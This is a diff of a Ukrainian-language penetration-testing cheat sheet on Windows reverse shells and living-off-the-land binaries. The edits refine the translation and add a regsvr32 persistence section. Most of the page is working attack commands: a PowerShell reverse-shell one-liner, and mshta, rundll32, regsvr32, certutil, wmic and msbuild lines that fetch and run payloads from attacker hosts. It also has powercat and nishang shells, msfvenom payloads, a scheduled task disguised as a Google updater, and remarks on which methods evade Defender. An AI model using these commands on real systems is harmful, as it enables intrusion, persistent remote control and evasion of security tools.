@@ -4,8 +4,8 @@
 
 ## Lolbas
 
-Сторінка [lolbas-project.github.io](https://lolbas-project.github.io/) призначена для Windows, як [https://gtfobins.github.io/](https://gtfobins.github.io/) для linux.\
-Очевидно, **в Windows немає SUID файлів або привілеїв sudo**, але корисно знати **як** деякі **бінарники** можуть бути (зловжито) використані для виконання деяких несподіваних дій, таких як **виконання довільного коду.**
+Сторінка [lolbas-project.github.io](https://lolbas-project.github.io/) призначена для Windows так само, як [https://gtfobins.github.io/](https://gtfobins.github.io/) — для linux.\
+Очевидно, **there aren't SUID files or sudo privileges in Windows**, але корисно знати, **як** деякі **binaries** можуть бути (зло)вживані для виконання деяких несподіваних дій, таких як **execute arbitrary code.**
 
 ## NC
 ```bash
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) є портативною та безпечною альтернативою Netcat**. Він працює на системах, подібних до Unix, та Win32. Завдяки таким функціям, як сильне шифрування, виконання програм, налаштовувані вихідні порти та безперервне перепідключення, sbd забезпечує універсальне рішення для TCP/IP зв'язку. Для користувачів Windows версія sbd.exe з дистрибутиву Kali Linux може бути використана як надійна заміна Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) є портативною та безпечною альтернативою Netcat**. Працює на системах Unix-like та Win32. Завдяки таким можливостям, як надійне шифрування, запуск програм, налаштовувані вихідні порти та автоматичне перепідключення, sbd забезпечує багатофункціональне рішення для TCP/IP-зв'язку. Для користувачів Windows версія sbd.exe з дистрибутива Kali Linux може використовуватися як надійна заміна Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -82,18 +82,22 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Процес, що виконує мережевий виклик: **powershell.exe**\
-Payload записано на диск: **НІ** (_принаймні, ніде, де я міг би знайти за допомогою procmon!_)
+Payload записано на диск: **НІ** (_принаймні ніде, де я міг знайти, використовуючи procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Процес, що виконує мережевий виклик: **svchost.exe**\
-Payload записано на диск: **Локальний кеш клієнта WebDAV**
+Процес, що здійснює мережевий виклик: **svchost.exe**\
+Payload записаний на диск: **WebDAV client local cache**
 
-**Однорядковий код:**
+**Однорядковий приклад:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Отримайте більше
+**Дізнайтеся більше про різні Powershell Shells наприкінці цього документа**
+
+## Mshta
+
+- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -105,13 +109,13 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Приклад зворотного шелу hta-psh (використовуйте hta для завантаження та виконання PS бекдору)**
+#### **Приклад hta-psh reverse shell (використовуйте hta для завантаження та виконання PS backdoor)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Ви можете дуже легко завантажити та виконати зомбі Koadic, використовуючи stager hta**
+**Ви можете дуже легко завантажити та виконати Koadic zombie, використовуючи stager hta**
 
-#### приклад hta
+#### hta приклад
 
 [**Звідси**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
@@ -130,7 +134,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**Звідси**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -157,11 +161,11 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Виявлено захисником**
+**Виявлено Defender**
 
 ## **Rundll32**
 
-[**Приклад Dll hello world**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
 
 - [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -171,11 +175,11 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Виявлено захисником**
+**Виявлено Defender**
 
 **Rundll32 - sct**
 
-[**Звідси**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -215,11 +219,31 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Виявлено захисником**
+**Виявлено Defender**
 
-#### Regsvr32 -sct
+#### Regsvr32 – довільний експорт DLL з аргументом /i (gatekeeping & persistence)
 
-[**Звідси**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+Окрім завантаження remote scriptlets (`scrobj.dll`), `regsvr32.exe` завантажує локальну DLL і викликає її експорти `DllRegisterServer`/`DllUnregisterServer`. Custom loaders часто зловживають цим, щоб виконати довільний код, маскуючись під підписаний LOLBin. Дві практичні нотатки, помічені в реалі:
+
+- Gatekeeping argument: DLL завершує роботу, якщо не передано конкретний switch через `/i:<arg>`, напр., `/i:--type=renderer`, щоб імітувати Chromium renderer children. Це зменшує випадкове виконання і ускладнює аналіз у sandboxes.
+- Persistence: schedule `regsvr32` to run the DLL with silent + high privileges and the required `/i` argument, masquerading as an updater task:
+```powershell
+Register-ScheduledTask \
+-Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
+-Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
+-TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
+-TaskPath '\\GoogleSystem\\GoogleUpdater' \
+-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
+-RunLevel Highest
+```
+
+See also: ClickFix clipboard‑to‑PowerShell variant that stages a JS loader and later persists with `regsvr32`.
+{{#ref}}
+../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
+{{#endref}}
+
+
+[**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 ```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -245,21 +269,21 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Ви можете дуже легко завантажити та виконати зомбі Koadic, використовуючи стейджер regsvr**
+**Ви можете дуже легко завантажити та виконати Koadic zombie, використовуючи stager regsvr**
 
 ## Certutil
 
 - [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
-Завантажте B64dll, декодуйте його та виконайте.
+Завантажте B64dll, декодуйте його та запустіть.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Завантажте B64exe, декодуйте його та виконайте.
+Завантажте B64exe, декодуйте його та запустіть.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Виявлено захисником**
+**Виявлено defender**
 
 ## **Cscript/Wscript**
 ```bash
@@ -269,14 +293,14 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Виявлено захисником**
+**Виявлено Defender**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
 Процес, що виконує мережевий виклик: **svchost.exe**\
-Payload записано на диск: **WebDAV клієнт локальний кеш**
+Payload записано на диск: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -302,11 +326,11 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Приклад файлу xsl [звідси](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Приклад xsl файлу [звідси](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -320,16 +344,15 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Не виявлено**
 
-**Ви можете дуже легко завантажити та виконати зомбі Koadic, використовуючи стейджер wmic**
+**Ви можете дуже легко завантажити & виконати Koadic zombie, використовуючи stager wmic**
 
 ## Msbuild
 
-- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Ви можете використовувати цю техніку, щоб обійти Application Whitelisting та обмеження Powershell.exe. Ви будете запрошені з PS shell.\
-Просто завантажте це та виконайте: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Ви можете використати цю техніку, щоб обійти Application Whitelisting та обмеження Powershell.exe. Вам відкриється PS shell.\ Просто завантажте це та виконайте його: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -337,21 +360,21 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Скомпілюйте код C# на машині жертви.
+Скомпілювати код C# на машині жертви.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Ви можете завантажити базову C# reverse shell звідси: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Ви можете завантажити базовий C# reverse shell звідси: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Не виявлено**
 
 ## **Regasm/Regsvc**
 
-- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**Я цього не пробував**
+**Я не пробував це**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
@@ -371,29 +394,29 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-У папці **Shells** є багато різних оболонок. Щоб завантажити та виконати Invoke-_PowerShellTcp.ps1_, скопіюйте скрипт і додайте в кінець файлу:
+У папці **Shells** є багато різних shells. Щоб завантажити та виконати Invoke-_PowerShellTcp.ps1_, зробіть копію скрипта і додайте її в кінець файлу:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Почніть обслуговувати скрипт на веб-сервері та виконайте його на стороні жертви:
+Почніть хостити script на web server та виконайте його на стороні victim:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender не виявляє це як шкідливий код (поки що, 3/04/2019).
+Defender поки що не виявляє його як шкідливий код (станом на 03/04/2019).
 
-**TODO: Перевірити інші оболонки nishang**
+**TODO: Перевірити інші nishang shells**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Завантажте, запустіть веб-сервер, запустіть прослуховувач і виконайте його на стороні жертви:
+Завантажити, запустити веб-сервер, запустити listener і виконати його на машині жертви:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender не виявляє це як шкідливий код (поки що, 3/04/2019).
+Defender не виявляє його як шкідливий код (поки що, 3/04/2019).
 
-**Інші варіанти, запропоновані powercat:**
+**Інші опції, які пропонує powercat:**
 
 Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
@@ -416,7 +439,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Створіть запусковий файл PowerShell, збережіть його у файл і завантажте та виконайте його.
+Створіть powershell launcher, збережіть його у файлі, завантажте та виконайте.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -426,25 +449,25 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Створіть версію backdoor metasploit на powershell, використовуючи unicorn
+Створити powershell-версію metasploit backdoor, використовуючи unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Запустіть msfconsole з створеним ресурсом:
+Запустіть msfconsole зі створеним ресурсом:
 ```
 msfconsole -r unicorn.rc
 ```
-Запустіть веб-сервер, що обслуговує файл _powershell_attack.txt_, і виконайте його на жертві:
+Запустіть веб-сервер, що обслуговує файл _powershell_attack.txt_, і виконайте на жертві:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
 **Виявлено як шкідливий код**
 
-## Більше
+## Детальніше
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS консоль з деякими агресивними PS модулями, попередньо завантаженими (шифрованими)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) Консоль PS із попередньо завантаженими offensive PS modules (cyphered)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS консоль з деякими агресивними PS модулями та виявленням проксі (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) Консоль PS з деякими offensive PS modules та proxy detection (IEX)
 
 ## Посилання
 
@@ -455,5 +478,6 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS консоль з деяк�
 - [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 
 {{#include ../../banners/hacktricks-training.md}}
